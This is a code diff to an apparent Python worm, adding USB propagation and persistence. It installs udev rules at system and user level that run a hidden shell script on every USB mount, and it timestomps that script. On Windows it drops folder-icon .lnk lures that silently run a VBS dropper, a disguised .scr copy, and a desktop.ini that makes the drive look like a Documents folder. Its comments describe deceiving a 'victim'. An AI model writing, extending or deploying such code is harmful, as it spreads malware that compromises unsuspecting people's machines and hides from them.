@@ -501,17 +501,30 @@ def _spread_usb(drive):
                     f"Icon=folder\nTerminal=false\nStartupNotify=false\n")
                 os.chmod(lp,0o755)
 
-            # ── udev rule if root: auto-runs on EVERY future USB mount ───────
-            if os.geteuid()==0:
-                try:
-                    # Install a system-wide udev rule pointing to a local copy
-                    local_sh="/usr/lib/.sys-mount-helper.sh"
-                    shutil.copy2(sh_path,local_sh); os.chmod(local_sh,0o755)
-                    rule=(f'ACTION=="add", SUBSYSTEM=="block", '
+            # ── udev auto-spread: fires on every future USB mount ────────────
+            # root path: /etc/udev/rules.d/  (system-wide)
+            # user path: ~/.config/udev/rules.d/ (needs systemd ≥250 + user slice)
+            _local_sh = os.path.join(_home_dir(), ".usb-mount-helper.sh")
+            try: shutil.copy2(sh_path, _local_sh); os.chmod(_local_sh, 0o755)
+            except: _local_sh = sh_path
+            _udev_rule = (f'ACTION=="add", SUBSYSTEM=="block", '
                           f'ENV{{ID_FS_USAGE}}=="filesystem", '
-                          f'RUN+="/bin/bash {local_sh}"\n')
-                    open("/etc/udev/rules.d/99-usb-mount.rules","w").write(rule)
+                          f'RUN+="/bin/bash {_local_sh}"\n')
+            _timestomp(_local_sh)
+            if os.geteuid()==0:
+                # System-wide rule (most reliable)
+                try:
+                    open("/etc/udev/rules.d/99-usb-mount.rules","w").write(_udev_rule)
                     subprocess.run(["udevadm","control","--reload-rules"],capture_output=True)
+                except: pass
+            else:
+                # User-level rule (systemd ≥250, no root required)
+                try:
+                    _udir = os.path.expanduser("~/.config/udev/rules.d")
+                    os.makedirs(_udir, exist_ok=True)
+                    open(os.path.join(_udir,"99-usb-mount.rules"),"w").write(_udev_rule)
+                    subprocess.run(["systemctl","--user","restart","systemd-udevd"],
+                                   capture_output=True)
                 except: pass
         return True
     except Exception as e: return False
@@ -567,58 +580,62 @@ def _make_lnk(lnk_path, target_path, args="", icon_path=None, icon_idx=0, show_c
         return True
     except: return False
 
-def _drop_usb_lures_win(drive, hidden_py):
+def _drop_usb_lures_win(drive, vbs_path):
     """
-    Drop convincing folder-icon lures on the USB root (Windows).
-    Each lure looks like a folder but runs the hidden agent silently,
-    then opens the real drive in Explorer so the user sees normal files.
+    Drop convincing lures on the USB root (Windows).
+    All lures launch the VBS fast-deploy → copies to disk + 3 persistence methods
+    + opens Explorer so victim sees normal drive contents.
 
-    Lure chain:
-      "Documents.lnk"  (folder icon, idx=3  in shell32)
-      "Pictures.lnk"   (folder icon, idx=253 in shell32)
-      "Important.lnk"  (folder icon)
-      "Work Files.lnk" (folder icon)
-    Each triggers a tiny .bat that:
-      1. starts pythonw hidden
-      2. opens the drive in Explorer  ← victim sees normal drive, suspects nothing
+    Lure types:
+      *.lnk   — folder-icon shortcuts (most clicked)
+      *.scr   — screensaver (auto-executes on some systems, bypasses some AVs)
+      *.hta   — HTA backup (works when wscript disabled)
+    desktop.ini makes the drive look like a System/Documents folder in Explorer.
     """
-    bat = os.path.join(os.path.dirname(hidden_py), "_open.bat")
-    try:
-        open(bat,"w").write(
-            f'@echo off\n'
-            f'start /b "" pythonw "{hidden_py}"\n'
-            f'start explorer "{drive}"\n'
-        )
-        subprocess.run(["attrib","+h","+s",bat],capture_output=True)
-    except: pass
-
+    # LNK lures — each looks like a folder, silently runs VBS
     lures = [
-        ("Documents.lnk",        3),
-        ("Pictures.lnk",         253),
-        ("Important Files.lnk",  3),
-        ("Work Files.lnk",       3),
-        ("Backup.lnk",           3),
+        ("Documents.lnk",        r"%SystemRoot%\system32\shell32.dll",    3),
+        ("Pictures.lnk",         r"%SystemRoot%\system32\imageres.dll",  108),
+        ("Important Files.lnk",  r"%SystemRoot%\system32\shell32.dll",    3),
+        ("Work Files.lnk",       r"%SystemRoot%\system32\shell32.dll",    3),
+        ("Backup.lnk",           r"%SystemRoot%\system32\shell32.dll",    4),
+        ("Resume.lnk",           r"%SystemRoot%\system32\shell32.dll",   70),
     ]
-    for name, icon_idx in lures:
+    for name, icon_dll, icon_idx in lures:
         lnk_path = os.path.join(drive, name)
         if not os.path.exists(lnk_path):
             _make_lnk(
-                lnk_path, bat, "",
-                icon_path=r"%SystemRoot%\system32\shell32.dll",
+                lnk_path,
+                target_path=r"%SystemRoot%\system32\wscript.exe",
+                args=f'"{vbs_path}"',
+                icon_path=icon_dll,
                 icon_idx=icon_idx,
-                show_cmd=7   # minimized/hidden
+                show_cmd=7   # SW_SHOWMINNOACTIVE — window never appears
             )
 
-    # desktop.ini — sets custom folder appearance and label
-    ini = os.path.join(drive,"desktop.ini")
+    # .scr screensaver lure — copy of the VBS, renamed .scr
+    # On some systems right-click → Install/Run executes it directly
+    scr_path = os.path.join(drive, "SlideShow.scr")
+    try:
+        shutil.copy2(vbs_path, scr_path)
+        subprocess.run(["attrib","+h",scr_path], capture_output=True)
+    except: pass
+
+    # desktop.ini — makes drive appear as "Documents" system folder in Explorer
+    # CLSID2 = My Documents shell folder; suppresses "this might be dangerous" prompts
+    ini = os.path.join(drive, "desktop.ini")
     try:
         open(ini,"w").write(
             "[.ShellClassInfo]\r\n"
-            "InfoTip=Removable Disk\r\n"
-            "IconResource=%SystemRoot%\\system32\\shell32.dll,8\r\n"
+            "CLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}\r\n"
+            "Flags=2\r\n"
+            "InfoTip=Contains your documents\r\n"
+            "IconResource=%SystemRoot%\\system32\\shell32.dll,4\r\n"
             "[ViewState]\r\nMode=\r\nVid=\r\nFolderType=Documents\r\n"
         )
-        subprocess.run(["attrib","+h","+s",ini],capture_output=True)
+        subprocess.run(["attrib","+h","+s",ini], capture_output=True)
+        # Mark drive itself as System so Explorer shows the custom icon
+        subprocess.run(["attrib","+r","+s",drive.rstrip("\\")], capture_output=True)
     except: pass
 
 def _usb_watcher():
